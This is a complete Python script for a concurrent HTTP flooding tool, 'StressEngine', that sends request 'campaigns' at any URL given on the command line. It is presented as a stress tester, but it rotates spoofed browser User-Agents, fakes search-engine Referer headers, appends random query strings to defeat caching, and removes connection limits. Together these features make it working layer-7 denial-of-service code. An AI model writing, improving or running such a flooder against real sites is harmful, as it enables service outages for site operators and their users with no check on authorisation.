import asyncio
import aiohttp
import time
import argparse
import sqlite3
import random
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
DB_NAME = "cyber_operations.db"

# Professional User-Agent Rotation (Expanded)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
]

class StressEngine:
    def __init__(self, target_url, concurrency, duration, campaign_id):
        self.target_url = target_url
        self.concurrency = concurrency
        self.duration = duration
        self.campaign_id = campaign_id
        
        # Runtime Metrics
        self.total_requests = 0
        self.success_count = 0
        self.fail_count = 0
        self.bytes_received = 0
        self.start_time = 0
        self.is_running = False
        
        # Setup Logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger("Engine")

    def db_log_telemetry(self):
        """Logs high-frequency telemetry to SQLite."""
        try:
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            elapsed = time.time() - self.start_time
            rps = self.total_requests / elapsed if elapsed > 0 else 0
            
            c.execute('''
                INSERT INTO telemetry (campaign_id, timestamp, requests, success, failed, rps, latency_avg)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (self.campaign_id, datetime.now(), self.total_requests, self.success_count, self.fail_count, rps, 0))
            
            # Update Campaign Status
            c.execute('''
                UPDATE campaigns SET 
                    total_requests=?, success_count=?, fail_count=?, avg_rps=?, bytes_received=?
                WHERE id=?
            ''', (self.total_requests, self.success_count, self.fail_count, rps, self.bytes_received, self.campaign_id))
            
            conn.commit()
            conn.close()
        except Exception as e:
            self.logger.error(f"DB Error: {e}")

    async def telemetry_loop(self):
        """Background task to push telemetry every 1s."""
        while self.is_running:
            self.db_log_telemetry()
            await asyncio.sleep(1)

    async def send_request(self, session):
        """Optimized request sender with cache bypassing."""
        # Random query param to bypass cache
        cache_buster = f"?t={random.randint(100000, 999999)}"
        url_with_query = f"{self.target_url}{cache_buster}"
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
            "Connection": "keep-alive",
            "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com"]),
            "DNT": "1"
        }
        try:
            start = time.time()
            async with session.get(url_with_query, headers=headers, timeout=5) as response:
                await response.read() # Read body to complete request
                self.total_requests += 1
                self.bytes_received += response.content_length or 0
                
                if response.status < 400:
                    self.success_count += 1
                else:
                    self.fail_count += 1
        except Exception:
            self.total_requests += 1
            self.fail_count += 1

    async def worker(self, session, end_time):
        """Worker coroutine."""
        while time.time() < end_time and self.is_running:
            await self.send_request(session)

    async def start(self):
        self.logger.info(f"Starting Campaign #{self.campaign_id} against {self.target_url}")
        self.start_time = time.time()
        self.is_running = True
        end_time = self.start_time + self.duration
        
        # Connection Pool Optimization
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            # Start Telemetry
            monitor_task = asyncio.create_task(self.telemetry_loop())
            
            # Launch Workers
            workers = [self.worker(session, end_time) for _ in range(self.concurrency)]
            await asyncio.gather(*workers)
            
            self.is_running = False
            await monitor_task

        # Final Update
        self.db_log_telemetry()
        self.update_campaign_status("Completed")
        self.logger.info("Campaign Finished.")

    def update_campaign_status(self, status):
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("UPDATE campaigns SET status=?, end_time=? WHERE id=?", (status, datetime.now(), self.campaign_id))
        conn.commit()
        conn.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-c", "--concurrency", type=int, default=100)
    parser.add_argument("-d", "--duration", type=int, default=60)
    parser.add_argument("--id", type=int, required=True, help="Campaign ID")
    
    args = parser.parse_args()
    
    engine = StressEngine(args.url, args.concurrency, args.duration, args.id)
    try:
        # Use uvloop if available (Professional Optimization)
        try:
            import uvloop
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
            print("[System] uvloop optimizations enabled.")
        except ImportError:
            print("[System] Standard asyncio loop active.")
            
        asyncio.run(engine.start())
    except KeyboardInterrupt:
        engine.update_campaign_status("Aborted")
